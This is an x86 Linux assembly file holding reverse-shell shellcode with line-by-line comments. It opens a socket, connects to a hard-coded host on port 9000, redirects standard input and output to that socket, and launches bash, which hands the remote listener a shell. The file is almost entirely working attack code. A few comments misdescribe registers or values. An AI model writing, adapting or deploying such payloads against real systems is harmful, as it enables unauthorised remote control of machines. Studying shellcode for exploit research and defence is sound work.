global _start

section .text

_start:

      xor eax, eax            ; Zeroes out EAX.
      xor ebx, ebx            ; Zeroes out EBX.
      xor ecx, ecx            ; Zeroes out ECX.
      xor edx, edx            ; Zeroes out EDX.

      push word 359           ; Pushes word 359 (socket) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov bl, 2               ; Moves value 2 into bl, giving the value AF_INET.
      mov cl, 1               ; Moves value 1 into bl, giving the value SOCK_STREAM.
      push edx                ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
      int 0x80                ; Call to kernel.
      mov esi, eax            ; Saves the value of eax for sockfd values later on.

connect:

      push word 362           ; Pushes word 362 (connect) into the stack
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
      push edx                ; Pushes 0.
      push dword 0x8b64a8c0   ; Pushes 192.168.100.139 in hex as a DWORD.
      push word 0x2823        ; Pushes 9000 in hex as a WORD.
      push word 0x02          ; Pushes AF_INET into the stack.
      mov ecx, esp            ; Copies the value of ESP into ECX.
      mov dl, 30              ; The value 30 is inserted into DL, as this argument requires the length of the struct.
      int 0x80                ; Call to kernel.

      xor ecx, ecx            ; Zeroes out ECX.
      mov cl, 0x3             ; Starts counter for dup2.

dup2:

      xor eax, eax            ; Zeroes out EAX.

      push word 63            ; Pushes word 63 (dup2) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
      dec cl                  ; Decrements cl in order to set the zero flag (ZF)
      int 0x80                ; Call to kernel.

      jnz dup2                ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.

execve:

      xor eax, eax            ; Zeroes out EAX.
      push eax                ; Pushes EAX (0x00000000).

      PUSH 0x68736162         ; hsab
      PUSH 0x2f6e6962         ; /nib
      PUSH 0x2f2f2f2f         ; ////

      mov ebx, esp            ; Copies the pushed instructions into EBX.
      push eax                ; Pushes EAX (0x00000000).

      mov edx, esp            ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0.

      push ebx                ; Pushes ////bin/bash into the stack.
      mov ecx, esp            ; Copies such value to ECX.
      push word 11            ; Pushes word 11 (execve) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      int 0x80                ; Calls to kernel.
